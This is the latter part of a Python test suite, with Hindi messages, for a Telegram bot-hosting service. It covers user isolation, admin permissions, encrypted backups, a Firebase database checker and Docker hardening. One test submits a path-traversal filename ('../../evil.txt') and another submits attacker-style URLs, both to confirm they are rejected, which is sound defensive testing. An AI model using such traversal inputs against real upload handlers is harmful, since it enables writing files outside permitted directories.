        for data in (f"act:stop:{a}", f"pick:logs:{a}", f"act:del:{a}", f"act:delc:{a}", f"cfg:token:{a}", f"dep:reinstall:{a}"):
            self.click(FRIEND, data)
        out = "\n".join(t for cid, t, _ in self.tg.sent[before:] if cid == FRIEND)
        self.assertIn("यह Bot नहीं मिला", out)
        self.assertTrue(self.ctx.runner.is_running(a))
        self.assertEqual(self.status(a), "running")
        self.assertTrue(da.exists())
        # Owner को भी दूसरे की फाइलें/Token नहीं मिलते (सिर्फ़ stop का अधिकार)
        with self.assertRaises(BotError):
            m.logs_text(OWNER, b)
        self.assertIn("रोक", m.stop_bot(OWNER, b))
        self.assertFalse(self.ctx.runner.is_running(b))

    def test_menu_22_buttons_all_work(self):
        """Menu के सभी 22 बटन (और Owner का Admin बटन) काम करते हैं, कोई खाली नहीं"""
        self.assertEqual(len(K.MENU), 22)
        self.upload_file(OWNER, SAMPLES / "plain_script.py")
        self.assertTrue(self.wait_status(self.first_bot(), "running"))
        for label in K.MENU + [K.ADMIN_BTN]:
            n = len(self.tg.sent)
            self.say(OWNER, label)
            self.assertGreater(len(self.tg.sent), n, f"{label}: कोई जवाब नहीं")
        # Friend को Admin बटन पर मना
        n = len(self.tg.sent)
        self.say(FRIEND, K.ADMIN_BTN)
        self.assertIn("सिर्फ़ Owner", "\n".join(self.tg.texts(FRIEND)))

    def test_slash_commands_and_permissions(self):
        """सभी Slash Commands चलते हैं; Owner Commands पर Friend को मना"""
        cmds = ["start", "help", "menu", "upload", "mybots", "status", "running", "startbot", "stopbot", "restartbot",
                "logs", "errors", "commands", "firebase", "server", "backup", "settings", "admin"]
        for c in cmds:
            n = len(self.tg.sent)
            self.say(OWNER, "/" + c)
            self.assertGreater(len(self.tg.sent), n, "/" + c)
        for c in ["addfriend 5", "removefriend 5", "users", "stats", "broadcast hi", "block 5", "unblock 5", "restartserver", "backupdb"]:
            n = len(self.tg.texts(FRIEND))
            self.say(FRIEND, "/" + c)
            self.assertIn("सिर्फ़ Owner", self.tg.texts(FRIEND)[-1], c)
        self.assertFalse(self.ctx.db.is_friend(5))
        self.assertFalse(getattr(self.ctx, "restart_requested", False))

    def test_admin_friend_block_flow(self):
        """Owner: Friend जोड़ना/हटाना/Block/Unblock/Broadcast/Stats/Backup; सभी को समान Access"""
        self.say(OWNER, "/addfriend 4444")
        self.assertTrue(self.ctx.access.is_allowed(4444))
        self.say(4444, "/start")
        self.assertIn("Premium", self.all_text(4444))
        self.upload_file(4444, SAMPLES / "plain_script.py")
        bid = self.first_bot(4444)
        self.assertTrue(self.wait_status(bid, "running"))
        self.say(OWNER, "/block 4444")
        self.assertFalse(self.ctx.access.is_allowed(4444))
        self.assertFalse(self.ctx.runner.is_running(bid), "Block करने पर उसके Bots रुकने चाहिए")
        self.say(4444, "/start")
        self.assertIn("Access Owner ने बंद", self.all_text(4444))
        self.say(OWNER, "/unblock 4444")
        self.assertTrue(self.ctx.access.is_allowed(4444))
        self.say(OWNER, "/removefriend 4444")
        self.assertFalse(self.ctx.access.is_allowed(4444))
        self.assertEqual(len(self.bots(4444)), 1, "Data सुरक्षित रहना चाहिए")
        self.say(OWNER, "/block " + str(OWNER))
        self.assertTrue(self.ctx.access.is_allowed(OWNER))
        self.say(OWNER, "/broadcast नमस्ते")
        self.assertIn("नमस्ते", self.all_text(FRIEND))
        self.say(OWNER, "/stats")
        self.assertIn("Total Users", self.all_text(OWNER))
        self.say(OWNER, "/users")
        self.say(OWNER, "/backupdb")
        self.assertTrue(self.tg.docs)
        self.click(OWNER, "adm:lock")
        self.say(FRIEND, "/start")
        self.assertIn("Lock", self.all_text(FRIEND))
        self.say(OWNER, "/start")  # Owner पर Lock का असर नहीं
        self.click(OWNER, "adm:lock")

    def test_restart_hosting_command(self):
        """/restartserver: पुष्टि के बाद ही Hosting Bot Restart माँगता है"""
        self.say(OWNER, "/restartserver")
        self.assertFalse(self.ctx.restart_requested)
        self.click(OWNER, "adm:restart_yes")
        self.assertTrue(self.ctx.restart_requested)


class T06_Backup(Base):
    def test_user_backup_restore_and_db_backup(self):
        """Backup & Restore: User Backup (Tokens Encrypted) → Restore, Database Backup → Restore"""
        z = self.sample_zip("tb.zip", {"bot.py": str(SAMPLES / "telebot_bot.py"), "telebot": str(STUBS / "telebot")})
        self.upload_file(OWNER, z, "tb.zip")
        bid = self.first_bot()
        self.wait_status(bid, "awaiting_config")
        self.say(OWNER, GOOD1, mid=60)
        self.assertTrue(self.wait_status(bid, "running"))
        info = self.ctx.backups.backup_user(OWNER)
        with zipfile.ZipFile(info["path"]) as zf:
            names = zf.namelist()
            self.assertIn("meta.json", names)
            blob = b"".join(zf.read(n) for n in names)
        self.assertNotIn(GOOD1.encode(), blob)           # Token Backup में plain नहीं
        self.assertFalse(any(".venv" in n for n in names))
        self.assertEqual(oct(os.stat(info["path"]).st_mode & 0o777), "0o600")
        # Restore: नया Bot (मौजूदा नहीं बदलता)
        ids = self.ctx.backups.restore_user(OWNER, info["id"])
        self.assertEqual(len(ids), 1)
        new = self.ctx.db.get_bot(ids[0])
        self.assertTrue(new["name"].endswith("_restored"), new["name"])
        self.assertEqual(self.ctx.tokens.get_bot_token(ids[0], OWNER), GOOD1)
        self.assertTrue((Path(new["project_dir"]) / "bot.py").exists())
        # दूसरे User का Backup Restore नहीं हो सकता
        from backup_manager import BackupError
        with self.assertRaises(BackupError):
            self.ctx.backups.restore_user(FRIEND, info["id"])
        # DB backup/restore
        d = self.ctx.backups.backup_db("test")
        self.ctx.db.add_friend(7777, OWNER)
        self.ctx.backups.restore_db(d["id"])
        self.assertFalse(self.ctx.db.is_friend(7777))
        self.assertTrue(self.ctx.db.is_friend(FRIEND))

    def test_bot_attach_and_analyze_only(self):
        """requirements.txt Attach, और सिर्फ़-विश्लेषण मोड (Host नहीं)"""
        self.upload_file(OWNER, SAMPLES / "plain_script.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "running"))
        self.upload(OWNER, "requirements.txt", "# कोई package नहीं\n".encode())
        cbd = self.find_cb(OWNER, "att:")
        self.assertTrue(cbd)
        self.click(OWNER, cbd)
        self.assertIn("जोड़ दी", self.all_text(OWNER))
        self.assertTrue((Path(self.ctx.db.get_bot(bid)["project_dir"]) / "requirements.txt").exists())
        # ../ वाला नाम
        self.upload(OWNER, "../../evil.txt", b"x")
        cbd = self.find_cb(OWNER, "att:")
        self.click(OWNER, cbd)
        self.assertFalse((self.cfg.data_dir / "evil.txt").exists())
        self.assertFalse(Path("/tmp/evil.txt").exists())
        # analyze-only
        self.click(OWNER, "ana:file")
        n = len(self.bots())
        self.upload_file(OWNER, SAMPLES / "telebot_bot.py")
        self.assertTrue(wait_for(lambda: "TeleBot" in self.all_text(OWNER).split("सिर्फ़ विश्लेषण कर रहा हूँ")[-1]))
        self.assertEqual(len(self.bots()), n)


class MockFirebase:
    DATA = {"users": {f"u{i}": {"name": f"n{i}", "online": (i % 3 == 0)} for i in range(10)}, "orders": {"o1": {"x": 1}}}

    def __init__(self):
        outer = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                u = urlparse(self.path)
                q = parse_qs(u.query)
                db = self.headers.get("X-Db", "pub")
                if db == "priv" and q.get("auth", [""])[0] != "GOODAUTH":
                    return self._s(401, {"error": "Permission denied"})
                if db == "missing":
                    return self._s(404, {"error": "404 Not Found"})
                path = u.path[:-5] if u.path.endswith(".json") else u.path
                cur = outer.DATA
                for p in [x for x in path.split("/") if x]:
                    cur = cur.get(p) if isinstance(cur, dict) else None
                if q.get("shallow") and isinstance(cur, dict):
                    cur = {k: True for k in cur}
                elif "limitToFirst" in q and isinstance(cur, dict):
                    cur = dict(sorted(cur.items())[: int(q["limitToFirst"][0])])
                self._s(200, cur)

            def _s(self, c, o):
                b = json.dumps(o).encode()
                self.send_response(c)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(b)))
                self.end_headers()
                self.wfile.write(b)

        self.srv = HTTPServer(("127.0.0.1", 0), H)
        self.port = self.srv.server_address[1]
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def getter(self, db):
        import requests

        def g(url, params=None, timeout=10):
            return requests.get(url.replace("https://", "http://"), params=params, headers={"X-Db": db}, timeout=timeout, allow_redirects=False)
        return g

    @property
    def url(self):
        return f"https://127.0.0.1:{self.port}"

    def close(self):
        self.srv.shutdown()


class T07_Firebase(Base):
    def setUp(self):
        super().setUp()
        self.mock = MockFirebase()

    def tearDown(self):
        self.mock.close()
        super().tearDown()

    def test_public_url(self):
        """Firebase Public URL: Connected, Response Time, Structure, Total/Online/Offline"""
        r = fb.check_url(self.mock.url, http_get=self.mock.getter("pub"), allow_any_host=True)
        self.assertEqual(r["status"], "connected")
        self.assertEqual(r["total_records"], 11)
        self.assertEqual((r["online"], r["offline"]), (4, 6))
        self.assertIsNotNone(r["response_ms"])
        self.assertEqual(r["structure"]["top_keys"], ["users", "orders"])
        self.assertIn("users", r["structure"]["collections"])

    def test_permission_denied_and_auth(self):
        """Firebase Permission Denied: Bypass नहीं; सही Auth देने पर ही पढ़ा जाता है"""
        r = fb.check_url(self.mock.url, http_get=self.mock.getter("priv"), allow_any_host=True)
        self.assertEqual(r["status"], "permission_denied")
        self.assertIsNone(r["total_records"])
        r = fb.check_url(self.mock.url, auth="WRONG", http_get=self.mock.getter("priv"), allow_any_host=True)
        self.assertEqual(r["status"], "permission_denied")
        r = fb.check_url(self.mock.url, auth="GOODAUTH", http_get=self.mock.getter("priv"), allow_any_host=True)
        self.assertEqual(r["status"], "connected")
        self.assertNotIn("GOODAUTH", json.dumps(r))

    def test_wrong_url(self):
        """गलत Firebase URL: Invalid/Not Found साफ़ पहचाना"""
        for raw in ("https://evil.example.com/x", "http://a-b.firebaseio.com", "https://u:p@a-b.firebaseio.com", "", "ftp://x.firebaseio.com"):
            self.assertEqual(fb.check_url(raw)["status"], "invalid_url", raw)
        r = fb.check_url(self.mock.url, http_get=self.mock.getter("missing"), allow_any_host=True)
        self.assertEqual(r["status"], "not_found")
        import requests
        def boom(*a, **k):
            raise requests.ConnectionError("x")
        self.assertEqual(fb.check_url("https://x-default-rtdb.firebaseio.com", http_get=boom)["status"], "error")

    def test_unknown_schema_no_guessing(self):
        """Schema अलग हो तो Online/Offline का अंदाज़ा नहीं लगाता"""
        MockFirebase.DATA = {f"k{i}": {"foo": i} for i in range(5)}
        try:
            r = fb.check_url(self.mock.url, http_get=self.mock.getter("pub"), allow_any_host=True)
        finally:
            MockFirebase.DATA = {"users": {f"u{i}": {"name": f"n{i}", "online": (i % 3 == 0)} for i in range(10)}, "orders": {"o1": {"x": 1}}}
        self.assertEqual(r["status"], "connected")
        self.assertIsNone(r["online"])
        self.assertTrue(any("उपलब्ध नहीं" in n for n in r["notes"]))

    def test_exports_and_txt_parse(self):
        """JSON/TXT/CSV Export और TXT Import parsing"""
        rs = fb.check_many([self.mock.url], http_get=self.mock.getter("pub"), allow_any_host=True)
        self.assertEqual(json.loads(fb.export_json(rs))["results"][0]["status"], "connected")
        self.assertIn("Total records", fb.export_txt(rs).decode())
        self.assertIn("total_records", fb.export_csv(rs).decode("utf-8-sig"))
        self.assertEqual(fb.parse_url_list("# c\nhttps://a.firebaseio.com extra\n\nhttps://b.firebaseio.com\n"), ["https://a.firebaseio.com", "https://b.firebaseio.com"])

    def test_ui_requires_authorization_confirmation(self):
        """Firebase UI: नया URL जाँचने से पहले 'मैं अधिकृत हूँ' की पुष्टि माँगता है; Mass-scan नहीं"""
        self.click(OWNER, "fb:single")
        self.say(OWNER, "https://my-app-default-rtdb.firebaseio.com/")
        self.assertIn("अनुमति की पुष्टि", self.all_text(OWNER))
        self.assertEqual(self.ctx.db.list_firebase_urls(OWNER), [])  # पुष्टि तक कुछ नहीं
        self.say(OWNER, "https://evil.example.com")
        self.assertIn("Firebase Realtime Database का URL नहीं", self.all_text(OWNER))
        # TXT import भी पुष्टि माँगता है
        self.click(OWNER, "fb:import")
        self.upload(OWNER, "urls.txt", b"https://a-default-rtdb.firebaseio.com\nhttps://b-default-rtdb.firebaseio.com\n")
        self.assertTrue(self.find_cb(OWNER, "fb:ok"))
        self.assertEqual(self.ctx.db.list_firebase_urls(OWNER), [])
        # दूसरे User के URL सूची अलग
        self.assertEqual(self.ctx.db.list_firebase_urls(FRIEND), [])

    def test_ui_full_check_and_export(self):
        """Firebase UI: पुष्टि → जाँच → नतीजा → Export (JSON/TXT/CSV फाइलें)"""
        import firebase_ui
        orig = fb.check_many
        mock = self.mock
        fb.check_many = lambda urls, auth_for=None, http_get=None, allow_any_host=False, workers=4: orig(
            urls, auth_for=auth_for, http_get=mock.getter("pub"), allow_any_host=True)
        orig_norm = fb.normalize_url
        fb.normalize_url = lambda raw, allow_any_host=False: orig_norm(raw, True)
        try:
            self.click(OWNER, "fb:single")
            self.say(OWNER, self.mock.url)
            self.click(OWNER, "fb:ok")
            self.assertTrue(wait_for(lambda: "जाँच पूरी" in self.all_text(OWNER), 20), self.all_text(OWNER))
            self.assertIn("Total records", self.all_text(OWNER))
            self.assertEqual(len(self.ctx.db.list_firebase_urls(OWNER)), 1)
            for k in ("json", "txt", "csv"):
                self.click(OWNER, f"fb:exp:{k}")
            self.assertEqual([d[1] for d in self.tg.docs], ["firebase_report.json", "firebase_report.txt", "firebase_report.csv"])
            # Auth token Encrypted और संदेश मिटाया गया
            self.click(OWNER, "fb:auth")
            self.say(OWNER, "MYAUTHTOKEN12345", mid=88)
            self.assertIn((OWNER, 88), self.tg.deleted)
            raw = self.ctx.db.q1("SELECT value_enc FROM api_configurations WHERE key_name='FIREBASE_AUTH'")["value_enc"]
            self.assertNotIn("MYAUTHTOKEN", raw)
        finally:
            fb.check_many = orig
            fb.normalize_url = orig_norm


class T08_Misc(Base):
    def test_config_validation(self):
        """Config: खाली Token/Owner/Key पर साफ़ Hindi संदेश; local runner बिना अनुमति नहीं"""
        c = Config()
        probs = c.validate()
        self.assertTrue(any("BOT_TOKEN" in p for p in probs))
        self.assertTrue(any("OWNER_ID" in p for p in probs))
        self.assertTrue(any("SECRET_KEY" in p for p in probs))
        c.runner_mode = "local"
        self.assertTrue(any("असुरक्षित" in p for p in c.validate()))
        with self.assertRaises(Exception):
            LocalRunner(c)

    def test_no_hardcoded_secrets_in_source(self):
        """Source में कोई Telegram Token/API Key hardcoded नहीं"""
        import re
        rx = re.compile(r"(?<!\d)\d{8,12}:[A-Za-z0-9_-]{35}")
        for p in ROOT.rglob("*"):
            if p.is_file() and p.suffix in (".py", ".sh", ".md", ".example", ".yml", ".txt", ".js") and "tests" not in p.parts and ".venv" not in p.parts:
                self.assertIsNone(rx.search(p.read_text("utf-8", "ignore")), str(p))
        for p in (ROOT / "backup_original").glob("*"):
            self.assertNotIn("AAHUrx", p.read_text("utf-8", "ignore"))

    def test_server_status_and_resources(self):
        """Server Status/CPU/RAM/Disk/Running Bots Text"""
        import server_monitor as sm
        self.assertIn("CPU", sm.cpu_text())
        self.assertIn("RAM", sm.ram_text())
        self.assertIn("Disk", sm.disk_text(self.cfg.data_dir))
        self.assertIn("गारंटी नहीं", sm.server_status_text(self.cfg, self.ctx.db, self.ctx.runner))
        self.assertTrue(sm.health(self.cfg, self.ctx.db, self.ctx.runner)["cpu"] >= 0)

    def test_docker_runner_command_is_hardened(self):
        """Docker command में Isolation flags हैं और docker.sock कभी नहीं (Docker न होने पर भी command बनाकर जाँचा)"""
        from docker_runner import DockerRunner
        r = DockerRunner(self.cfg)
        args = r._common("om_b1", self.tmp, None, True, 256, 0.5, 64)
        j = " ".join(args)
        for must in ("--cap-drop ALL", "no-new-privileges", "--read-only", "--pids-limit", "--memory 256m", "--memory-swap 256m",
                     "--cpus 0.5", "--user", "dst=/work", "--network om_net"):
            self.assertIn(must, j)
        self.assertNotIn("docker.sock", j)
        self.assertNotIn("--privileged", j)
        self.assertNotIn("--user 0", j)
        uid = args[args.index("--user") + 1]
        self.assertNotEqual(uid.split(":")[0], "0")
        ok, msg = r.available()
        self.assertFalse(ok)  # इस टेस्ट Sandbox में Docker नहीं है

    def test_log_clear_and_rename_delete(self):
        """Logs साफ़ करना, Rename, Delete (फाइलें/Token भी हटते हैं)"""
        self.upload_file(OWNER, SAMPLES / "plain_script.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "running"))
        self.assertTrue(wait_for(lambda: "tick" in self.ctx.manager.logs_text(OWNER, bid)))
        self.ctx.manager.clear_logs(OWNER, bid)
        self.assertNotIn("tick 1\n", self.ctx.manager.logs_text(OWNER, bid))
        self.say(OWNER, K.ACTION_OF and "📜 Live Logs")
        self.assertIn("Logs", self.all_text(OWNER))
        self.click(OWNER, f"act:rename:{bid}")
        self.say(OWNER, "मेरा बॉट")
        self.assertEqual(self.ctx.db.get_bot(bid)["name"], "मेरा बॉट")
        root = Path(self.ctx.db.get_bot(bid)["project_dir"]).parent
        self.click(OWNER, f"act:del:{bid}")
        self.click(OWNER, f"act:delc:{bid}")
        self.assertIsNone(self.ctx.db.get_bot(bid))
        self.assertFalse(root.exists())
        self.assertFalse(self.ctx.runner.is_running(bid))

    def test_bot_limit_per_user(self):
        """हर User के Bots की सीमा"""
        self.cfg.max_bots_per_user = 1
        self.upload_file(OWNER, SAMPLES / "plain_script.py")
        self.first_bot()
        shutil.copy(SAMPLES / "plain_script.py", self.tmp / "two.py")
        self.upload_file(OWNER, self.tmp / "two.py")
        self.assertTrue(wait_for(lambda: "तक Host कर सकते हैं" in self.all_text(OWNER), 10))
        self.assertEqual(len(self.bots()), 1)


if __name__ == "__main__":
    unittest.main(verbosity=2)
